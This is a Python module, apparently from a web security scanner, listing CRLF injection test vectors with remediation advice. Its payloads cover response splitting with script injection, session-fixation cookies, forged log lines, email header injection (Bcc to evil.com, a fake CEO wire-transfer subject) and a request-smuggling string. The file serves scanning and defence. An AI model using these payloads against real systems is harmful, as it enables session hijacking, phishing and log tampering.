"""
CRLF Injection Test Vectors
Targets HTTP response splitting, header injection, and log poisoning
"""

from ..models import (
    TestVector,
    VulnerabilityType,
    TestVectorPosition as Position,
    PositionType,
    TestVectorPayload as PayloadTemplate,
    TestVectorEvidence as Evidence,
    ConfidenceLevel,
    SensitivityLevel,
)

CRLF_INJECTION_VECTORS = [
    TestVector(
        id="crlf-http-header-001",
        name="CRLF HTTP Response Header Injection",
        description="Inject malicious headers into HTTP response using CRLF characters",
        vuln_type=VulnerabilityType.CRLF_INJECTION,
        position=Position(
            type=PositionType.QUERY, name="redirect", value_prefix="", value_suffix=""
        ),
        payload=PayloadTemplate(
            base="%0d%0aSet-Cookie:%20admin=true",
            variants=[
                "%0d%0aLocation:%20http://evil.com",
                "%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Length:%2019%0d%0a%0d%0a<script>alert(1)</script>",
                "%0aSet-Cookie:%20session=attacker_session",
                "%0d%0aX-XSS-Protection:%200",
            ],
            encoding="url",
        ),
        expected_evidence=Evidence(
            indicators=[
                "Injected header in response",
                "Set-Cookie in response",
                "Multiple HTTP responses",
            ],
            confidence=ConfidenceLevel.HIGH,
        ),
        sensitivity=SensitivityLevel.HIGH,
        tags=["crlf", "injection", "http-header", "response-splitting", "xss"],
        references=[
            "https://owasp.org/www-community/vulnerabilities/CRLF_Injection",
            "https://book.hacktricks.xyz/pentesting-web/crlf-0d-0a",
            "https://portswigger.net/kb/issues/00200200_http-response-header-injection",
        ],
        remediation="Validate and sanitize all user input in headers, strip CRLF characters, use framework header functions",
    ),
    TestVector(
        id="crlf-log-injection-001",
        name="CRLF Log Injection",
        description="Inject false log entries to poison application logs",
        vuln_type=VulnerabilityType.CRLF_INJECTION,
        position=Position(
            type=PositionType.QUERY, name="username", value_prefix="", value_suffix=""
        ),
        payload=PayloadTemplate(
            base="admin%0a[2024-01-01 00:00:00] INFO: Admin login successful from 127.0.0.1",
            variants=[
                "attacker%0d%0a[2024-01-01] SUCCESS: User 'admin' logged in successfully",
                "user%0aFailed login attempt for admin from 127.0.0.1%0aSuccessful login for attacker",
                "test%0d%0a%0d%0a[CRITICAL] Database backup completed - admin",
                "guest%0a[SECURITY] Firewall rule added: ALLOW ALL from 0.0.0.0/0 - admin",
            ],
            encoding="url",
        ),
        expected_evidence=Evidence(
            indicators=[
                "False log entries",
                "Log pollution",
                "Injected log lines",
                "SIEM confusion",
            ],
            confidence=ConfidenceLevel.HIGH,
        ),
        sensitivity=SensitivityLevel.MEDIUM,
        tags=["crlf", "injection", "log-injection", "log-poisoning", "forensics"],
        references=[
            "https://cwe.mitre.org/data/definitions/117.html",
            "https://owasp.org/www-community/attacks/Log_Injection",
            "https://www.acunetix.com/blog/web-security-zone/what-is-log-injection/",
        ],
        remediation="Sanitize all input before logging, use structured logging (JSON), validate newline characters",
    ),
    TestVector(
        id="crlf-email-header-001",
        name="CRLF Email Header Injection",
        description="Inject additional email headers to send spam or phishing emails",
        vuln_type=VulnerabilityType.CRLF_INJECTION,
        position=Position(
            type=PositionType.BODY_FORM, name="email", value_prefix="", value_suffix=""
        ),
        payload=PayloadTemplate(
            base="victim@example.com%0d%0aBcc:%20attacker@evil.com",
            variants=[
                "user@example.com%0d%0aCc:%20spam1@evil.com,spam2@evil.com",
                "test@example.com%0aSubject:%20You%20Won%20$1,000,000",
                "contact@example.com%0d%0aBcc:%20spam@evil.com%0d%0aContent-Type:%20text/html",
                "admin@example.com%0aFrom:%20CEO@company.com%0aSubject:%20Urgent:%20Wire%20Transfer",
            ],
            encoding="url",
        ),
        expected_evidence=Evidence(
            indicators=[
                "Email sent to unintended recipients",
                "Modified subject",
                "Additional headers",
                "BCC/CC added",
            ],
            confidence=ConfidenceLevel.HIGH,
        ),
        sensitivity=SensitivityLevel.HIGH,
        tags=["crlf", "injection", "email", "smtp", "phishing", "spam"],
        references=[
            "https://blog.securelayer7.net/email-header-injection-vulnerability/",
            "https://www.netsparker.com/blog/web-security/email-header-injection/",
            "https://www.acunetix.com/websitesecurity/email-header-injection/",
        ],
        remediation="Validate email addresses, strip newline characters, use mail library functions, implement rate limiting",
    ),
    TestVector(
        id="crlf-response-splitting-001",
        name="CRLF HTTP Response Splitting",
        description="Split HTTP response to inject arbitrary content and create XSS",
        vuln_type=VulnerabilityType.CRLF_INJECTION,
        position=Position(
            type=PositionType.HEADER, name="X-Custom-Header", value_prefix="", value_suffix=""
        ),
        payload=PayloadTemplate(
            base="test%0d%0a%0d%0a<script>alert(document.cookie)</script>",
            variants=[
                "value%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0a%0d%0a<html><body><h1>Defaced</h1></body></html>",
                "test%0aContent-Type:%20text/html%0a%0a<img%20src=x%20onerror=alert(1)>",
                "normal%0d%0a%0d%0a<iframe%20src=http://evil.com></iframe>",
                "user%0d%0aTransfer-Encoding:%20chunked%0d%0a%0d%0a0%0d%0a%0d%0aGET%20/admin%20HTTP/1.1%0d%0aHost:%20localhost",
            ],
            encoding="url",
        ),
        expected_evidence=Evidence(
            indicators=[
                "Split HTTP response",
                "Injected content",
                "JavaScript execution",
                "Multiple responses",
            ],
            confidence=ConfidenceLevel.HIGH,
        ),
        sensitivity=SensitivityLevel.CRITICAL,
        tags=["crlf", "injection", "response-splitting", "xss", "cache-poisoning"],
        references=[
            "https://www.owasp.org/index.php/HTTP_Response_Splitting",
            "https://portswigger.net/kb/issues/00200300_http-response-splitting",
            "https://capec.mitre.org/data/definitions/105.html",
        ],
        remediation="Validate all header values, strip CRLF characters, use secure framework functions, implement CSP",
    ),
    TestVector(
        id="crlf-session-fixation-001",
        name="CRLF Session Fixation via Cookie Injection",
        description="Fix user session by injecting Set-Cookie header through CRLF",
        vuln_type=VulnerabilityType.CRLF_INJECTION,
        position=Position(type=PositionType.QUERY, name="lang", value_prefix="", value_suffix=""),
        payload=PayloadTemplate(
            base="en%0d%0aSet-Cookie:%20PHPSESSID=attacker_session_id;%20Path=/",
            variants=[
                "en%0aSet-Cookie:%20session_token=fixed_token_12345;%20HttpOnly;%20Secure",
                "fr%0d%0aSet-Cookie:%20auth=attacker_auth_token;%20Domain=.victim.com;%20Path=/",
                "de%0d%0aSet-Cookie:%20user_id=1;%20Path=/%0d%0aSet-Cookie:%20is_admin=true",
                "es%0aSet-Cookie:%20JSESSIONID=attacker_jsession;%20Path=/;%20HttpOnly",
            ],
            encoding="url",
        ),
        expected_evidence=Evidence(
            indicators=["Set-Cookie injected", "Session ID fixed", "Cookie in response headers"],
            confidence=ConfidenceLevel.HIGH,
        ),
        sensitivity=SensitivityLevel.CRITICAL,
        tags=["crlf", "injection", "session-fixation", "cookie", "authentication"],
        references=[
            "https://owasp.org/www-community/attacks/Session_fixation",
            "https://www.netsparker.com/blog/web-security/session-fixation-attacks/",
            "https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html",
        ],
        remediation="Regenerate session IDs after authentication, validate header values, strip CRLF characters",
    ),
]
